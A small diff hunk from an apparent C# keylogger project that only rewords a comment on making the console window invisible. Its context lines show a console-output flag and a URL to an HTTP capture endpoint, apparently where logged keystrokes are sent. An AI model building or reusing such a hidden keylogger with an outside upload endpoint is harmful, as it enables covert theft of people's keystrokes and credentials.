@@ -17,7 +17,7 @@ namespace Keylogger
             //-------------------------------------------------------//
 
             bool EnableConsoleOutput = true;
-            //If you want to become console invisible, go to project -> properties ->
+            //If you want console to become invisible, go to project -> properties ->
             //application and set output type to windows application
 
             string URL = @"https://ptsv2.com/t/l0l8k-1585687144/post";
